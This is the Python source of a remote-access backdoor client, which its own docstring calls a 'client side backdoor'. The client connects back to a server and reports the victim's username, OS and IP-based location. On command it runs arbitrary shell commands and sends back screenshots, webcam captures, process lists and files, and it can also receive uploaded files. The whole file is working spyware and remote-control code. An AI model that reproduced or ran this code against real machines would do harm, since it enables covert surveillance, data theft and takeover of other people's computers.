# coding: utf-8

__author__ = '@zNairy'
__contact__ = 'Discord: __Nairy__#7181 | Github: https://github.com/zNairy/'
__version__ = '2.0'

from socket import socket, AF_INET, SOCK_STREAM
from getpass import getuser
from datetime import datetime
from pyscreenshot import grab
from cv2 import VideoCapture, imencode
from psutil import process_iter, AccessDenied, ZombieProcess
from pathlib import Path
from json import loads as jloads
from pickle import loads, dumps
from subprocess import getoutput
from requests import get
from os import uname, chdir, getcwd
from time import sleep, time
from urllib3.exceptions import InsecureRequestWarning
from urllib3 import disable_warnings

disable_warnings(InsecureRequestWarning)

class Client(object):
    """ client side backdoor """
    def __init__(self, host='0.0.0.0', port=5000):
        self.__Address = (host, port)
        self.screenshotPath = '/tmp/736f6e61726973.png' if uname().sysname.lower() == 'linux' else f'C:/Users/{getuser()}/AppData/Local/Temp/736f6e61726973.png'

    def __repr__(self):
        print(f'Server(host="{self.__Address[0]}", port={self.__Address[1]})')

    # removing the screenshot file
    def removeScreenshot(self):
        Path(self.screenshotPath).unlink(missing_ok=True)

    # getting info of all processes running in the moment
    def getProcessList(self, args):
        data = [proc.info for proc in process_iter(['pid', 'username', 'name', 'exe', 'cwd'])]

        self.sendHeader({"total": len(data), "bytes": len(dumps(data))})
        sleep(0.5)
        self.__Client.send(dumps(data))

    # receiving a file from server side (upload)
    def upload(self, args):
        header = loads(self.__Client.recv(512))
        try:
            self.receiveFile(header)
            self.sendHeader({"content": f"File {Path(args).stem} uploaded successfully!", "sucess": True})

        except PermissionError:
            self.sendHeader({"content": f"Permission denied: {args}", "sucess": False})

    # checking if exist any available webcam to use
    def checkAvailableWebcams(self):
        # trying to detect any available webcam and return ids if exists
        availableWebcams = [f'{id+1} ' for id in range(10) if VideoCapture(id).isOpened()]

        if availableWebcams:
            return {
                "sucess": True,
                "content": f"[green]There's [yellow]{len(availableWebcams)}[green] webcams available | IDs: [white]{''.join(webcamId for webcamId in availableWebcams)}"
                }
        
        return {"sucess": False, "content": "[red]There's no webcam available"}

    # taking a webcam shot from id
    def webcamshot(self, args):
        if args:
            try:
                # trying to taking a webcam shot and converting the frame in to bytes string
                wcamshot = imencode('.png', VideoCapture(int(args)-1).read()[1])[1].tobytes() if VideoCapture(int(args)-1).isOpened() else False
                
                if wcamshot and int(args) > 0: # if there is any frame by the given id
                    header = {
                        "namefile": datetime.now().strftime('%d.%m.%y-%H.%M.%S'),
                        "extension": '.png',
                        "bytes": len(wcamshot),
                        "path": "screenshots",
                        "sucess": True
                    }

                    self.sendHeader(header)
                    sleep(0.5)
                    self.__Client.send(wcamshot)
                else:
                    self.sendHeader({"content": f"[red]There's no webcam with ID [yellow]{args}", "sucess": False})
            except ValueError:
                self.sendHeader({"content": f"[red] Invalid Id [yellow]{args}[red], must be a number", "sucess": False})
        else:
            availableWebcams = self.checkAvailableWebcams()
            self.sendHeader(availableWebcams)

    # taking a screenshot
    def screenshot(self, args):
        grab().save(self.screenshotPath) # taking and saving the screenshot
        namefile, extension, file = self.splitFile(self.screenshotPath);del(namefile)
        self.removeScreenshot()
        
        header = {
            "namefile": datetime.now().strftime('%d.%m.%y-%H.%M.%S'),
            "extension": extension,
            "bytes": len(file),
            "path": "screenshots"
        }

        self.sendHeader(header)
        sleep(1)
        self.__Client.send(file)
    
    # sending a local file to server side (download)
    def download(self, args):
        try:
            if Path(args).is_file(): # if file exists
                namefile, extension, file = self.splitFile(args)
                header = {
                    "namefile": namefile,
                    "extension": extension,
                    "bytes": len(file),
                    "path": "files",
                    "sucess": True
                }

                self.sendHeader(header)
                sleep(1)
                self.__Client.send(file)
            else:
                self.sendHeader({"content": f"File {Path(args).stem} not found", "sucess": False})

        except PermissionError:
            self.sendHeader({"content": f"Permission denied: {args}", "sucess": False})

    # saving a received file from server side 
    def saveReceivedFile(self, path, content):
        with open(path, 'wb') as receivedFile:
            receivedFile.write(content)

    # receiving a file from server side (upload)
    def receiveFile(self, header):
        file = b''

        while len(file) < header['bytes']:
            file += self.__Client.recv(header['bytes'])

        self.saveReceivedFile(f'{header["namefile"]}{header["extension"]}', file)
    
    # returns name of file, extension and your bytes content
    def splitFile(self, path):
        with open(path, 'rb') as file:
            return Path(path).stem, Path(path).suffix, file.read()

    # send header to server side (about messages, files...)
    def sendHeader(self, header):
        self.__Client.send(dumps(header))

    # changing to the directory, informed from the server side
    def changeDirectory(self, directory):
        try:
            chdir(directory)
            self.sendCommand(self.lastCommand, '.')
        
        except PermissionError:
            self.sendCommand(self.lastCommand)
        except FileNotFoundError:
            self.sendCommand(self.lastCommand)

    # returns all 'internal' commands
    def allCommands(self):
        return {
            "/screenshot": {"action": self.screenshot},
            "/download": {"action": self.download},
            "/upload": {"action": self.upload},
            "/webcamshot": {"action": self.webcamshot},
            "/getprocesslist": {"action": self.getProcessList},
            "cd": {"action": self.changeDirectory}
        }

    # returns function of the command (your action) and your respective arguments, if exists, if not returns False (is a shell command).
    def splitCommand(self, command):
        if self.allCommands().get(command.split()[0]):
            return self.allCommands()[command.split()[0]]['action'], ''.join(f'{cmd} ' for cmd in command.split()[1:]) # 1: function, 2: args #

        return False, ''

    # returns output of the command informed
    def outputCommand(self, command):
        return getoutput(command).encode()

    # sending the command output that was executed in shell
    def sendCommand(self, command, customOutput=''):
        if not customOutput:
            output = self.outputCommand(command)
        else:
            output = customOutput.encode()

        header = {
            "initialTime": time(),
            "bytes": len(output),
            "currentDirectory": getcwd()
        }
        
        self.sendHeader(header)
        sleep(0.5) # small delay to send the data
        self.__Client.send(output)

    # checking and executing command informed by server side
    def runCommand(self, cmd):
        command, args = self.splitCommand(cmd)

        if command:
            command(args.strip())
        else:
            self.sendCommand(cmd) # send the output of shell command

    # receiving server side commands
    def listenServer(self):
        while True:
            command = self.__Client.recv(512)
            if command:
                self.lastCommand = command
                self.runCommand(command.decode('utf-8'))
            else:
                self.run()

    # returns some basic data about client
    def identifier(self):
        identifier = {"name": getuser(), "SO": uname().sysname, "arch": uname().machine, "currentDirectory": getcwd()}
        
        try:
            info = jloads(get('http://ip-api.com/json/').content) # locality
            identifier.update({"externalAddress": info['query'], "city": info['city'], "country": info['country'], "region": info['region']})
        except Exception:
            pass
        
        return dumps(identifier)

    # trying to connect to the server
    def connect(self):
        try:
            self.__Client.connect((self.__Address))
            self.__Client.send(self.identifier())
            
        except ConnectionRefusedError:
            sleep(5);self.connect()

    # configuring the socket object
    def configureSocket(self):
        self.__Client = socket(AF_INET, SOCK_STREAM)

    # starting the program
    def run(self):
        self.configureSocket()
        self.connect()
        
        self.listenServer()


def main():
    client = Client('127.0.0.1', 5000)
    client.run()

if __name__ == '__main__':
    main()